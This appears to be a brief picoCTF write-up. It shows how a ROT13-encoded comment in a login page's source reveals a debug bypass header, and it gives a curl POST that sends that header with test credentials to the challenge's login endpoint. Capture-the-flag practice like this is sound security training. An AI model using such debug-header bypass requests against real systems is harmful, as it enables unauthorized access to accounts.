# Username
ctf-player@picoctf.org

# Concept
Debug HTTP header

# Method of Solve
viewing website source we see 
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
which is a ROT 13, we place translate that we get
```
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```
the code shows us that it is looking for Json
Using curl 
```
curl -v -X POST -H "X-Dev-Access: yes" -H "Content-Type: application/json" -d '{"email": "ctf-player@picoctf.org", "password": "test"}' http://amiable-citadel.picoctf.net:55852/login
```
